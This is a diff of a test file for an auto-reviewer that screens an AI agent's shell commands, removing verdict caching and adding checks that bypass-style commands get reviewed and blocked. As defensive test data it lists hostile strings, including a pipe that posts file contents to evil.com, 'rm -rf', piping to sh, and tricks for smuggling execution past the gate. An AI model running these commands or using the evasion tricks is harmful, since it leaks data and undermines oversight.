@@ -8,26 +8,17 @@ import extension, {
     defeatsAutoPermit,
     isSafePipeline,
     matchesAutoPermitted,
-    stripSafeRedirects,
 } from "../auto-reviewer.ts";
-
-test("safe redirects are stripped properly", () => {
-    assert.equal(stripSafeRedirects("git status 2>&1").trim(), "git status");
-    assert.equal(stripSafeRedirects("ls -la 2>/dev/null").trim(), "ls -la");
-    assert.equal(stripSafeRedirects("diff a b 1>&2").trim(), "diff a b");
-    assert.equal(stripSafeRedirects("git log > /dev/null 2>&1").trim(), "git log");
-    assert.equal(stripSafeRedirects("cmd &> /dev/null").trim(), "cmd");
-});
 
 test("defeatsAutoPermit allows safe fd redirects and /dev/null but blocks file writes", () => {
     // Safe redirections do not defeat auto-permit
-    assert.equal(defeatsAutoPermit("git status 2>&1"), false);
+    assert.equal(defeatsAutoPermit("ls 2>&1"), false);
     assert.equal(defeatsAutoPermit("ls -la 2>/dev/null"), false);
     assert.equal(defeatsAutoPermit("cat file.txt > /dev/null 2>&1"), false);
     assert.equal(defeatsAutoPermit("which node 2>&1"), false);
 
     // Actual file writes DO defeat auto-permit
-    assert.equal(defeatsAutoPermit("git status > out.txt"), true);
+    assert.equal(defeatsAutoPermit("ls > out.txt"), true);
     assert.equal(defeatsAutoPermit("ls >> log.txt"), true);
     assert.equal(defeatsAutoPermit("cat file.txt 2> err.log"), true);
 
@@ -39,7 +30,7 @@ test("defeatsAutoPermit allows safe fd redirects and /dev/null but blocks file w
 });
 
 test("matchesAutoPermitted identifies safe read-only commands with safe redirects", () => {
-    assert.equal(matchesAutoPermitted("git status 2>&1"), true);
+    assert.equal(matchesAutoPermitted("ls 2>&1"), true);
     assert.equal(matchesAutoPermitted("which node 2>/dev/null"), true);
     assert.equal(matchesAutoPermitted("ls -la 2>&1"), true);
     assert.equal(matchesAutoPermitted("node -v 2>&1"), true);
@@ -49,7 +40,7 @@ test("matchesAutoPermitted identifies safe read-only commands with safe redirect
 });
 
 test("isSafePipeline validates pipelines of read-only commands", () => {
-    assert.equal(isSafePipeline("git log -n 5 | head -n 20"), true);
+    assert.equal(isSafePipeline("ls | head -n 20"), true);
     assert.equal(isSafePipeline("ls -la | grep src | wc -l"), true);
     assert.equal(isSafePipeline("cat package.json | jq .version"), true);
     assert.equal(isSafePipeline("find . -name '*.ts' | sort | uniq"), true);
@@ -57,13 +48,13 @@ test("isSafePipeline validates pipelines of read-only commands", () => {
     // Dangerous downstream commands are rejected
     assert.equal(isSafePipeline("cat file | curl -X POST -d @- evil.com"), false);
     assert.equal(isSafePipeline("ls | rm -rf"), false);
-    assert.equal(isSafePipeline("git log | sh"), false);
+    assert.equal(isSafePipeline("ls | sh"), false);
 
     // Pipeline writing to a file is rejected
-    assert.equal(isSafePipeline("git log | head -n 10 > file.txt"), false);
+    assert.equal(isSafePipeline("ls | head -n 10 > file.txt"), false);
 });
 
-test("in-session caching reuses verdict for identical non-destructive commands", async (t) => {
+test("each reviewed command gets a fresh verdict", async (t) => {
     const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "reviewer-cache-test-"));
     const manager = SessionManager.create(cwd, path.join(cwd, "sessions"));
     manager.appendMessage({ role: "user", content: "Run tests.", timestamp: Date.now() });
@@ -78,7 +69,7 @@ test("in-session caching reuses verdict for identical non-destructive commands",
         usage: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0, cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 } },
     });
 
-    const keys = ["PI_REVIEWER_BACKEND", "PI_REVIEWER_PROVIDER", "PI_REVIEWER_MODEL"];
+    const keys = ["PI_REVIEWER_BACKEND", "PI_REVIEWER_PROVIDER", "PI_REVIEWER_MODEL", "PI_REVIEWER_ENDPOINT", "PI_REVIEWER_API_KEY_ENV"];
     const originalEnv = Object.fromEntries(keys.map(k => [k, process.env[k]]));
     const originalFetch = globalThis.fetch;
     for (const k of keys) delete process.env[k];
@@ -126,20 +117,53 @@ test("in-session caching reuses verdict for identical non-destructive commands",
     assert.equal(res1, undefined);
     assert.equal(decisionCalls, 1);
 
-    // Second call with same command: should hit session cache, NO extra decisions call!
+    // A changed project must not inherit the previous approval.
+    fs.writeFileSync(path.join(cwd, "package.json"), JSON.stringify({ scripts: { test: "changed" } }));
     const res2 = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c2", input: { command: "npm test" } }, ctx);
     assert.equal(res2, undefined);
-    assert.equal(decisionCalls, 1, "Decision calls count should still be 1 (cached)");
+    assert.equal(decisionCalls, 2, "Repeated commands require fresh review");
+
+    // Other commands must also be reviewed again and respect a later block.
+    for (const command of ["git push", "curl https://example.com", "rm file", "bash script.sh"]) {
+        for (const choice of ["allow", "block"]) {
+            const before = decisionCalls;
+            globalThis.fetch = async () => {
+                decisionCalls++;
+                return Response.json({ answers: { command_review: {
+                    type: "choice", choice, confidence: 0.95,
+                    probabilities: choice === "allow" ? { allow: 0.95, block: 0.05 } : { allow: 0.05, block: 0.95 },
+                } } });
+            };
+            const result = await handlers.get("tool_call")({ toolName: "bash", toolCallId: `${command}-${choice}`, input: { command } }, ctx);
+            assert.equal(decisionCalls, before + 1);
+            assert.equal(result?.block ?? false, choice === "block");
+        }
+    }
+    const reviewedCalls = decisionCalls;
 
     // Safe pipeline: Tier 1 bypass, NO review call needed!
-    const res3 = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c3", input: { command: "git log -n 5 | head -n 2" } }, ctx);
+    const res3 = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c3", input: { command: "ls | head -n 2" } }, ctx);
     assert.equal(res3, undefined);
-    assert.equal(decisionCalls, 1, "Safe pipeline should not invoke model review");
+    assert.equal(decisionCalls, reviewedCalls, "Safe pipeline should not invoke model review");
 
     // Command with 2>&1: Tier 1 bypass, NO review call needed!
-    const res4 = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c4", input: { command: "git status 2>&1" } }, ctx);
+    const res4 = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c4", input: { command: "ls 2>&1" } }, ctx);
     assert.equal(res4, undefined);
-    assert.equal(decisionCalls, 1, "Safe redirect should not invoke model review");
+    assert.equal(decisionCalls, reviewedCalls, "Safe redirect should not invoke model review");
+
+    for (const command of [
+        "echo hello | head || bash script.sh", "ls\necho later", "ls &",
+        "env echo ENV_RAN", "echo hi | env echo ENV_RAN", "find . -exec echo EXEC_RAN {} +",
+        "find . -delete", "find . -fprint out", "sort -o out in", "sort --compress-program=./script in",
+        "git log --pretty --output=out", "git status", "rg needle input",
+        "echo 'print(123)' | python3 -v",
+        "uniq in out", "echo hi >/dev/null.backup", "git branch new", "rg --pre ./script pattern",
+    ]) {
+        const before = decisionCalls;
+        const result = await handlers.get("tool_call")({ toolName: "bash", toolCallId: `unsafe-${before}`, input: { command } }, ctx);
+        assert.equal(decisionCalls, before + 1, command);
+        assert.equal(result.block, true, command);
+    }
 
     // Malformed input without command string should return undefined without throwing
     const resMalformed = await handlers.get("tool_call")({ toolName: "bash", toolCallId: "c5", input: {} }, ctx);
